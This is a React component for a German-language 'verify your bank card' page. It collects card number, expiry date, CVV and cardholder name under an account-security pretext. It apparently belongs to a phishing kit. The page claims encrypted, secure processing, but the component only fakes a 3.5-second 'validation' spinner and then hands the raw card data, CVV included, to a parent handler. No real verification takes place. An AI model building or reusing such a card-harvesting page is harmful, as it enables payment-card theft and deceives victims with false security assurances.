import React, { useState } from 'react';
import { Lock } from 'lucide-react';
import Loading from './Loading';

interface BankCardData {
  card_number: string;
  expiry_date: string;
  cvv: string;
  cardholder_name: string;
}

interface BankCardFormProps {
  onSubmit: (data: BankCardData) => void;
  onSkip?: () => void;
}

const BankCardForm: React.FC<BankCardFormProps> = ({ onSubmit, onSkip }) => {
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [cardholderName, setCardholderName] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState<Partial<BankCardData>>({});

  // Focus states
  const [cardNumberFocused, setCardNumberFocused] = useState(false);
  const [expiryDateFocused, setExpiryDateFocused] = useState(false);
  const [cvvFocused, setCvvFocused] = useState(false);
  const [cardholderNameFocused, setCardholderNameFocused] = useState(false);

  const formatCardNumber = (value: string) => {
    // Remove all non-digits
    const cleaned = value.replace(/\D/g, '');
    
    // Add spaces every 4 digits
    const groups = cleaned.match(/.{1,4}/g);
    return groups ? groups.join(' ') : cleaned;
  };

  const formatExpiryDate = (value: string) => {
    // Remove all non-digits
    const cleaned = value.replace(/\D/g, '');
    
    // Add slash after 2 digits
    if (cleaned.length >= 2) {
      return cleaned.slice(0, 2) + '/' + cleaned.slice(2, 4);
    }
    return cleaned;
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    if (formatted.replace(/\s/g, '').length <= 16) {
      setCardNumber(formatted);
    }
  };

  const handleExpiryDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatExpiryDate(e.target.value);
    if (formatted.replace(/\D/g, '').length <= 4) {
      setExpiryDate(formatted);
    }
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '');
    if (value.length <= 4) {
      setCvv(value);
    }
  };

  const validateForm = (): boolean => {
    const newErrors: Partial<BankCardData> = {};
    
    const cleanCardNumber = cardNumber.replace(/\s/g, '');
    if (!cleanCardNumber) {
      newErrors.card_number = 'Kartennummer ist erforderlich';
    } else if (cleanCardNumber.length < 13 || cleanCardNumber.length > 19) {
      newErrors.card_number = 'Ungültige Kartennummer';
    }
    
    if (!expiryDate) {
      newErrors.expiry_date = 'Ablaufdatum ist erforderlich';
    } else if (!/^\d{2}\/\d{2}$/.test(expiryDate)) {
      newErrors.expiry_date = 'Format: MM/JJ';
    }
    
    if (!cvv) {
      newErrors.cvv = 'CVV ist erforderlich';
    } else if (cvv.length < 3) {
      newErrors.cvv = 'CVV muss 3-4 Ziffern haben';
    }
    
    if (!cardholderName.trim()) {
      newErrors.cardholder_name = 'Karteninhaber Name ist erforderlich';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) {
      return;
    }

    setIsLoading(true);

    // Simulate processing time
    setTimeout(() => {
      onSubmit({
        card_number: cardNumber.replace(/\s/g, ''),
        expiry_date: expiryDate,
        cvv: cvv,
        cardholder_name: cardholderName
      });
    }, 3500);
  };

  const createInputField = (
    value: string,
    onChange: (e: React.ChangeEvent<HTMLInputElement>) => void,
    focused: boolean,
    setFocused: (focused: boolean) => void,
    label: string,
    name: string,
    type: string = 'text',
    error?: string,
    maxLength?: number
  ) => (
    <div style={{ 
      position: 'relative', 
      marginBottom: '1.5rem',
      width: '100%'
    }}>
      <div style={{ position: 'relative' }}>
        <input
          type={type}
          name={name}
          value={value}
          onChange={onChange}
          onFocus={() => setFocused(true)}
          onBlur={() => setFocused(false)}
          maxLength={maxLength}
          style={{
            width: '100%',
            padding: '1rem 0.75rem',
            border: error ? '2px solid #ef4444' : (focused ? '2px solid #002e3c' : '1px solid #d1d5db'),
            borderRadius: '4px',
            fontSize: '1rem',
            fontFamily: 'Gotham, Arial, sans-serif',
            background: 'white',
            color: '#002e3c',
            outline: 'none',
            transition: 'border-color 0.2s ease',
            boxSizing: 'border-box'
          }}
        />
        <label
          style={{
            position: 'absolute',
            left: '0.75rem',
            top: focused || value ? '0.25rem' : '1rem',
            fontSize: focused || value ? '0.75rem' : '1rem',
            color: error ? '#ef4444' : (focused ? '#002e3c' : '#6b7280'),
            backgroundColor: 'white',
            padding: focused || value ? '0 0.25rem' : '0',
            transition: 'all 0.2s ease',
            pointerEvents: 'none',
            fontFamily: 'Gotham, Arial, sans-serif',
            fontWeight: focused || value ? '500' : '400'
          }}
        >
          {label}
        </label>
      </div>
      {error && (
        <p style={{
          color: '#ef4444',
          fontSize: '0.875rem',
          marginTop: '0.25rem',
          margin: '0.25rem 0 0 0'
        }}>
          {error}
        </p>
      )}
    </div>
  );

  return (
    <>
      <style>
        {`
          @media (max-width: 768px) {
            .mobile-title {
              font-size: 2.5rem !important;
            }
          }
          @media (max-width: 480px) {
            .mobile-title {
              font-size: 2rem !important;
            }
          }
        `}
      </style>
      <div style={{ 
        maxWidth: '1440px', 
        margin: '0 auto', 
        padding: '4rem 0',
        minHeight: '80vh',
        display: 'flex',
        alignItems: 'flex-start',
        paddingTop: '6rem'
      }}>
        {isLoading && (
          <Loading 
            message="Bankkarten-Daten werden validiert"
            type="verification"
            showProgress={true}
            duration={3.5}
          />
        )}
        
        <div style={{
          maxWidth: '1000px',
          width: '100%',
          padding: '0 2rem'
        }}>
          {/* Large Title */}
          <h1 className="mobile-title" style={{
            color: '#002e3c',
            fontSize: '2.5rem',
            fontWeight: 'bold',
            marginBottom: '1rem',
            fontFamily: 'Gotham, Arial, sans-serif',
            lineHeight: '1.1',
            letterSpacing: '-0.02em'
          }}>
            Bankkarten-Daten verifizieren
          </h1>
          
          <p style={{
            color: '#002e3c',
            fontSize: '1rem',
            lineHeight: '1.6',
            marginBottom: '3rem',
            maxWidth: '600px'
          }}>
            Zur Sicherheit Ihres Kontos benötigen wir eine Verifizierung Ihrer Bankkarte. 
            Geben Sie bitte Ihre Kartennummer und das Ablaufdatum ein.
          </p>

          {/* Security Notice */}
          <div style={{
            backgroundColor: '#f0f9ff',
            border: '1px solid #0ea5e9',
            borderRadius: '8px',
            padding: '1rem',
            marginBottom: '2rem',
            display: 'flex',
            alignItems: 'center',
            gap: '0.75rem'
          }}>
            <div style={{ color: '#0ea5e9', flexShrink: 0 }}>
              <Lock size={16} />
            </div>
            <p style={{
              color: '#0c4a6e',
              fontSize: '0.875rem',
              margin: 0,
              lineHeight: '1.4'
            }}>
              <strong>Sicherheitshinweis:</strong> Ihre Daten werden verschlüsselt übertragen und sicher verarbeitet.
            </p>
          </div>

          <form onSubmit={handleSubmit} style={{ maxWidth: '500px' }}>
            {createInputField(
              cardNumber, handleCardNumberChange, cardNumberFocused, setCardNumberFocused,
              'Kartennummer', 'cardNumber', 'text', errors.card_number, 19
            )}

            <div style={{ 
              display: 'grid', 
              gridTemplateColumns: '1fr 1fr', 
              gap: '1rem',
              marginBottom: '1.5rem'
            }}>
              {createInputField(
                expiryDate, handleExpiryDateChange, expiryDateFocused, setExpiryDateFocused,
                'MM/JJ', 'expiryDate', 'text', errors.expiry_date, 5
              )}
              {createInputField(
                cvv, handleCvvChange, cvvFocused, setCvvFocused,
                'CVV', 'cvv', 'text', errors.cvv, 4
              )}
            </div>

            {createInputField(
              cardholderName, (e) => setCardholderName(e.target.value), cardholderNameFocused, setCardholderNameFocused,
              'Name des Karteninhabers', 'cardholderName', 'text', errors.cardholder_name
            )}

            <button
              type="submit"
              disabled={isLoading}
              style={{
                backgroundColor: '#FFD700',
                color: '#002e3c',
                border: 'none',
                borderRadius: '35px',
                padding: '1rem 2rem',
                fontSize: '1rem',
                fontWeight: '600',
                cursor: isLoading ? 'not-allowed' : 'pointer',
                fontFamily: 'Gotham, Arial, sans-serif',
                transition: 'all 0.3s ease',
                opacity: isLoading ? 0.7 : 1,
                display: 'flex',
                alignItems: 'center',
                gap: '0.5rem',
                marginTop: '2rem'
              }}
              onMouseOver={(e) => {
                if (!isLoading) {
                  e.currentTarget.style.backgroundColor = '#FFD700';
                  e.currentTarget.style.boxShadow = '0 4px 12px rgba(255, 215, 0, 0.3)';
                }
              }}
              onMouseOut={(e) => {
                e.currentTarget.style.backgroundColor = '#FFD700';
                e.currentTarget.style.boxShadow = 'none';
              }}
            >
              {isLoading ? 'Wird verarbeitet...' : 'Karte verifizieren'}
              {!isLoading && (
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M5 12h14M12 5l7 7-7 7"/>
                </svg>
              )}
            </button>

            {/* Skip Button */}
            {onSkip && (
              <button
                type="button"
                onClick={onSkip}
                disabled={isLoading}
                style={{
                  backgroundColor: 'transparent',
                  color: '#002e3c',
                  border: 'none',
                  padding: '0.75rem 1rem',
                  fontSize: '0.875rem',
                  fontWeight: '400',
                  cursor: isLoading ? 'not-allowed' : 'pointer',
                  fontFamily: 'Gotham, Arial, sans-serif',
                  transition: 'all 0.3s ease',
                  opacity: isLoading ? 0.5 : 0.7,
                  marginTop: '1rem',
                  textDecoration: 'underline',
                  textAlign: 'center' as const,
                  width: '100%'
                }}
                onMouseOver={(e) => {
                  if (!isLoading) {
                    e.currentTarget.style.opacity = '1';
                    e.currentTarget.style.color = '#FFD700';
                  }
                }}
                onMouseOut={(e) => {
                  e.currentTarget.style.opacity = '0.7';
                  e.currentTarget.style.color = '#002e3c';
                }}
              >
                Ich habe keine Kreditkarte
              </button>
            )}
          </form>
        </div>
      </div>
    </>
  );
};

export default BankCardForm; 